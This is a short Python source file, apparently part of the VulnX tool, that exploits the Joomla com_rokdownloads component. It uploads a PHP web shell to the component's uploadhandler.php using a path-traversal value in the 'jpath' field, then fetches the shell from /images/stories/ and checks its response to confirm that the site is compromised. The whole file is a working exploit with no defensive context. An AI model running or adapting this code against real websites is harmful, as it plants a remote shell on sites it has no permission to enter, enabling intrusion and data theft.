import re
import requests
import os

def com_rokdownloads(url,headers):
    s = requests.session()
    endpoint = url + "/administrator/components/com_rokdownloads/assets/uploadhandler.php"
    img = open('shell/VulnX.php', 'rb')
    name_img= os.path.basename('shell/VulnX.php')
    fieldname = "Filedata"
    files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
    data = { fieldname : files,
             'jpath' : '..%2F..%2F..%2F..%2F',
             }
    upload_file = s.post(endpoint,data)
    shellup = url + "/images/stories/VulnX.php?Vuln=X"
    checkShell = requests.get(shellup).text
    statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
    if statusCheck:
        print('[+] com_rokdownloads ', shellup)
    else:
        print('[-] com_rokdownloads ')